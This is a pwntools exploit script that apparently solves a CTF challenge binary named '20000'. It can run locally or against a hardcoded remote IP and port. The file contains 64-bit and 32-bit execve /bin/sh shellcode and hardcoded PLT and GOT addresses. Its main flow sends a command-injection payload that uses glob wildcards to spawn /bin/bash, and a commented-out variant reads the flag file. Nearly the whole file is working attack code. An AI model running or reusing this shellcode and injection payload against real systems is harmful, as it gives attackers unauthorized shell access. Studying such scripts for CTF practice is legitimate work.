#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './20000'
binary = ELF(program_name)

remote_server = '110.10.147.106'
PORT =  15959

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============ PLT =========== #

_gmon_start___PLT = 0x400900
puts_PLT = 0x40082c
dlsym_PLT = 0x4008e0
__stack_chk_fail_PLT = 0x400840
__isoc99_scanf_PLT = 0x4008b0
dlopen_PLT = 0x400880
exit_PLT = 0x4008d0
dlerror_PLT = 0x4008f0
__libc_start_main_PLT = 0x400860
printf_PLT = 0x400850
fprintf_PLT = 0x400870
dlclose_PLT = 0x400890
setvbuf_PLT = 0x4008a0
sprintf_PLT = 0x4008c0

# ============ GOT =========== #

_gmon_start___GOT = 0x601ff8
puts_GOT = 0x602018
stdout_GOT = 0x6020a0
dlsym_GOT = 0x602070
stdin_GOT = 0x6020b0
__isoc99_scanf_GOT = 0x602058
__stack_chk_fail_GOT = 0x602020
exit_GOT = 0x602068
__libc_start_main_GOT = 0x602030
setvbuf_GOT = 0x602050
stderr_GOT = 0x6020c0
printf_GOT = 0x602028
fprintf_GOT = 0x602038
dlclose_GOT = 0x602048
dlerror_GOT = 0x602078
dlopen_GOT = 0x602040
sprintf_GOT = 0x602060

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    p.send('13602')
    # gdb.attach(p,'''
    # b *0x400c3b
    # ''')
    #p.send('." \n cat ./??a? # ".')
    p.send('." \n /bi?/ba?h # ".')

    # ============ GDB =========== #
    #gdb.attach(p)

    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
